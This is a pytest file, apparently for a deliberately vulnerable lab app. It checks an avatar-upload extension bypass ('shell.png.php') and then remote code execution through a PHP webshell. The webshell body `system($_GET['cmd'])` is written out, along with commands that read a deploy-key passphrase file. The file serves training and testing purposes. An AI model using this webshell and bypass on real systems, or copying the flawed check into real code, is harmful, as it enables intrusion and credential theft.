"""
PHP upload bypass + RCE checks — chain step 4.

Verifies the file upload vulnerability on /account/settings/avatar and the
subsequent code execution via /static/uploads/<filename>?cmd=<command>.

The vulnerability is a substring extension check: _valid_image() checks whether
any image extension string appears *anywhere* in the filename, so 'shell.png.php'
passes because '.png' is a substring.  The server then executes .php files when
they contain 'system(' and '$_GET'.

Tests cover:
  - Valid PNG upload succeeds
  - File with no image magic bytes is rejected
  - shell.png.php with valid PNG magic bytes is accepted and saved
  - Saved shell.png.php executes shell commands via ?cmd=
  - The deploy.key passphrase is readable via RCE

All upload tests require an authenticated session.
"""
import io
import os
import pytest

# ---------------------------------------------------------------------------
# CONFIG — filenames, magic bytes, shell content, expected command outputs
# ---------------------------------------------------------------------------
CONFIG = {
    # PNG magic bytes (first 8 bytes of a valid PNG file)
    "png_magic": b"\x89PNG\r\n\x1a\n",

    # A minimal valid PNG (magic bytes + enough bytes to look like a real file)
    # This is the magic header only — real tests use this as the file content
    "valid_png_filename": "test_avatar.png",

    # File with no valid magic bytes — must be rejected
    "invalid_magic_content": b"This is not an image file at all.",
    "invalid_no_ext_filename": "notanimage.txt",
    "invalid_just_php_filename": "shell.php",          # no image ext substring

    # The bypass: valid PNG magic + .php final extension
    "shell_filename": "shell.png.php",

    # Minimal PHP webshell body (must contain system( and $_GET)
    "shell_body": b"<?php system($_GET['cmd']); ?>\n",

    # Commands to test RCE with
    "cmd_id": "id",
    "cmd_id_expected_snippet": b"uid=",   # present in any Unix id output

    # Passphrase file paths (the app writes to /tmp/cerodias/deploy.key as fallback)
    "passphrase_paths": [
        "/var/cerodias/deploy.key",
        "/tmp/cerodias/deploy.key",
    ],
    "expected_passphrase": b"cerodias-deploy-2024",
}

UPLOAD_URL = "/account/settings/avatar"


def _make_upload(filename: str, content: bytes, content_type: str = "image/png"):
    """Return a dict suitable for use as the 'data' arg in client.post(files=...)."""
    return {
        "avatar": (io.BytesIO(content), filename, content_type),
    }


def _png_content(extra: bytes = b"") -> bytes:
    """Return minimal PNG magic bytes followed by optional extra bytes."""
    return CONFIG["png_magic"] + extra


class TestUploadValidation:
    """Upload handler correctly accepts valid images and rejects invalid ones."""

    def test_settings_page_requires_login(self, client):
        """/account/settings redirects to login when unauthenticated."""
        resp = client.get("/account/settings")
        assert resp.status_code in (301, 302)

    def test_settings_page_accessible_when_logged_in(self, authed_client):
        """/account/settings returns 200 for an authenticated user."""
        resp = authed_client.get("/account/settings")
        assert resp.status_code == 200

    def test_upload_endpoint_requires_login(self, client):
        """POST to /account/settings/avatar without a session redirects."""
        data = _make_upload(CONFIG["valid_png_filename"], _png_content())
        resp = client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")
        assert resp.status_code in (301, 302)

    def test_valid_png_upload_succeeds(self, authed_client):
        """A file with valid PNG magic bytes and a .png filename is accepted."""
        data = _make_upload(CONFIG["valid_png_filename"], _png_content(b"\x00" * 64))
        resp = authed_client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")
        assert resp.status_code == 200
        assert b"Profile picture updated" in resp.data

    def test_valid_png_file_is_saved(self, authed_client, app):
        """Accepted upload writes the file to the uploads directory."""
        filename = "saved_check.png"
        data = _make_upload(filename, _png_content(b"\x00" * 32))
        authed_client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")
        upload_dir = os.path.join(app.root_path, "static", "uploads")
        assert os.path.exists(os.path.join(upload_dir, filename)), (
            f"Expected {filename} in {upload_dir} after upload"
        )

    def test_no_magic_bytes_rejected(self, authed_client):
        """File without image magic bytes is rejected with an error message."""
        data = _make_upload(
            CONFIG["invalid_no_ext_filename"],
            CONFIG["invalid_magic_content"],
            "application/octet-stream",
        )
        resp = authed_client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")
        assert resp.status_code == 200
        assert b"valid image" in resp.data.lower() or b"error" in resp.data.lower(), (
            "Expected an error message for file with no magic bytes"
        )
        assert b"Profile picture updated" not in resp.data

    def test_php_only_extension_rejected(self, authed_client):
        """
        A file named 'shell.php' (no image extension substring) with valid PNG
        magic bytes is rejected — the substring check fails.
        """
        data = _make_upload(CONFIG["invalid_just_php_filename"], _png_content(b"\x00" * 32))
        resp = authed_client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")
        assert resp.status_code == 200
        assert b"Profile picture updated" not in resp.data


class TestUploadBypass:
    """shell.png.php with valid PNG magic bytes bypasses the extension check."""

    def test_shell_png_php_is_accepted(self, authed_client):
        """
        shell.png.php with PNG magic bytes is accepted because '.png' appears
        as a substring in the filename — the intentional bypass.
        """
        content = CONFIG["png_magic"] + CONFIG["shell_body"]
        data = _make_upload(CONFIG["shell_filename"], content)
        resp = authed_client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")
        assert resp.status_code == 200
        assert b"Profile picture updated" in resp.data, (
            "shell.png.php was rejected — extension bypass is not working"
        )

    def test_shell_png_php_is_saved(self, authed_client, app):
        """Accepted shell file is written to the uploads directory."""
        content = CONFIG["png_magic"] + CONFIG["shell_body"]
        data = _make_upload(CONFIG["shell_filename"], content)
        authed_client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")
        upload_dir = os.path.join(app.root_path, "static", "uploads")
        assert os.path.exists(os.path.join(upload_dir, CONFIG["shell_filename"])), (
            f"shell.png.php was not saved to {upload_dir}"
        )


class TestRCE:
    """
    Remote code execution via the uploaded webshell.

    Requires that TestUploadBypass.test_shell_png_php_is_saved has already run
    within the same test session (the app fixture is session-scoped, so the
    upload directory persists).  If the shell file is missing, the serve_upload
    route returns 404 and the RCE tests will fail with a clear message.
    """

    def _upload_shell(self, authed_client):
        """Ensure the shell file is present before testing RCE."""
        content = CONFIG["png_magic"] + CONFIG["shell_body"]
        data = _make_upload(CONFIG["shell_filename"], content)
        authed_client.post(UPLOAD_URL, data=data, content_type="multipart/form-data")

    def test_shell_endpoint_exists_after_upload(self, authed_client, client):
        """
        After uploading shell.png.php, the serve_upload route returns 200 for
        the file (no ?cmd= yet).
        """
        self._upload_shell(authed_client)
        resp = client.get(f"/static/uploads/{CONFIG['shell_filename']}")
        assert resp.status_code == 200, (
            f"/static/uploads/{CONFIG['shell_filename']} returned {resp.status_code} — "
            "shell was not saved or the serve_upload route is not registered"
        )

    def test_rce_id_command_executes(self, authed_client, client):
        """
        GET /static/uploads/shell.png.php?cmd=id executes the id command and
        returns output containing 'uid=' — confirms RCE.
        """
        self._upload_shell(authed_client)
        resp = client.get(
            f"/static/uploads/{CONFIG['shell_filename']}?cmd={CONFIG['cmd_id']}"
        )
        assert resp.status_code == 200
        assert CONFIG["cmd_id_expected_snippet"] in resp.data, (
            f"'uid=' not found in RCE output — shell may not contain system( or $_GET"
        )

    def test_rce_reads_passphrase_file(self, authed_client, client):
        """
        GET /static/uploads/shell.png.php?cmd=cat <path> returns the passphrase
        'cerodias-deploy-2024'.  Tries /var/cerodias/deploy.key first (production
        path), then /tmp/cerodias/deploy.key (fallback written by _seed_ssh_key).
        """
        self._upload_shell(authed_client)
        found = False
        for path in CONFIG["passphrase_paths"]:
            resp = client.get(
                f"/static/uploads/{CONFIG['shell_filename']}?cmd=cat+{path}"
            )
            if resp.status_code == 200 and CONFIG["expected_passphrase"] in resp.data:
                found = True
                break
        assert found, (
            f"Passphrase {CONFIG['expected_passphrase']!r} not found via RCE. "
            f"Tried paths: {CONFIG['passphrase_paths']}. "
            "Check that _seed_ssh_key ran at startup and wrote the key file."
        )
